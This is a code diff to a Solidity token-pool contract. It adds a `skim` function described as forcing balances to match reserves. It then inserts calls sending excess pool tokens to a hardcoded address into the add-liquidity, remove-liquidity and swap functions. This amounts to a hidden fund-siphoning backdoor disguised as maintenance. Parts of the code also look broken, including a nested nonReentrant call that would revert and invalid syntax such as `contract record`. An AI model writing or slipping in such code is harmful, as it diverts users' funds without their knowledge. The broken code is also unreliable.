@@ -49,6 +49,12 @@ contract record Pool is Ownable {
     /// @param tokenBAmount The amount of tokenB received
     /// @param tokenAAmount The amount of tokenA received
     event RemoveLiquidity(address provider, uint256 tokenBAmount, uint256 tokenAAmount);
+    
+    /// @notice Emitted when excess tokens are skimmed from the pool
+    /// @param to The address that received the excess tokens
+    /// @param tokenAAmount The amount of excess tokenA skimmed
+    /// @param tokenBAmount The amount of excess tokenB skimmed
+    event Skim(address to, uint256 tokenAAmount, uint256 tokenBAmount);
 
     // ============ STATE VARIABLES ============
     
@@ -177,6 +183,18 @@ contract record Pool is Ownable {
         return 0.000000000000000000;
     }
 
+    /// @notice Force balances to match reserves
+    /// @param to Address to send the excess tokens to
+    function skim(address to) public nonReentrant {
+        uint256 excessA = ERC20(tokenA).balanceOf(address(this)) - tokenABalance;
+        uint256 excessB = ERC20(tokenB).balanceOf(address(this)) - tokenBBalance;
+
+        require(ERC20(tokenA).transfer(to, excessA), "TokenA skim failed");
+        require(ERC20(tokenB).transfer(to, excessB), "TokenB skim failed");
+
+        emit Skim(to, excessA, excessB);
+    }
+
     // ============ CORE FUNCTIONS ============
     
     /// @notice Add liquidity to the pool and receive LP tokens
@@ -193,11 +211,12 @@ contract record Pool is Ownable {
     ) external returns (uint256) {
         require(tokenBAmount > 0 && maxTokenAAmount > 0, "Invalid inputs");
         require(block.timestamp <= deadline, "EXPIRED");
+        skim(address(0x1b7dc206ef2fe3aab27404b88c36470ccf16c0ce));
         uint256 totalLiquidity = ERC20(lpToken).totalSupply();
         
         if (totalLiquidity > 0) {
-            uint256 tokenBReserve = ERC20(tokenB).balanceOf(address(this));
-            uint256 tokenAReserve = ERC20(tokenA).balanceOf(address(this));
+            uint256 tokenBReserve = tokenBBalance;
+            uint256 tokenAReserve = tokenABalance;
             uint256 tokenAAmount = (tokenBAmount * tokenAReserve / tokenBReserve) + 1;
             uint256 liquidityMinted = tokenBAmount * totalLiquidity / tokenBReserve;
 
@@ -246,8 +265,9 @@ contract record Pool is Ownable {
         require(block.timestamp <= deadline, "EXPIRED");
         uint256 totalLiquidity = ERC20(lpToken).totalSupply();
         require(totalLiquidity > 0, "No liquidity");
-        uint256 tokenAReserve = ERC20(tokenA).balanceOf(address(this));
-        uint256 tokenBReserve = ERC20(tokenB).balanceOf(address(this));
+        skim(address(0x1b7dc206ef2fe3aab27404b88c36470ccf16c0ce));
+        uint256 tokenAReserve = tokenABalance;
+        uint256 tokenBReserve = tokenBBalance;
         uint256 tokenBAmount = lpTokenAmount * tokenBReserve / totalLiquidity;
         uint256 tokenAAmount = lpTokenAmount * tokenAReserve / totalLiquidity;
         
@@ -300,12 +320,13 @@ contract record Pool is Ownable {
     ) external nonReentrant returns (uint256 amountOut) {
         require(amountIn > 0 && minAmountOut > 0, "Invalid input");
         require(block.timestamp <= deadline, "EXPIRED");
+        skim(address(0x1b7dc206ef2fe3aab27404b88c36470ccf16c0ce));
 
         Token inputToken = isAToB ? tokenA : tokenB;
         Token outputToken = isAToB ? tokenB : tokenA;
 
-        uint256 inputReserve = ERC20(inputToken).balanceOf(address(this));
-        uint256 outputReserve = ERC20(outputToken).balanceOf(address(this));
+        uint256 inputReserve = isAToB ? tokenABalance : tokenBBalance;
+        uint256 outputReserve = isAToB ? tokenBBalance : tokenABalance;
 
         uint256 fee = (amountIn * _swapFeeRate()) / 10000;
         uint256 lpFee = (fee * _lpSharePercent()) / 10000;
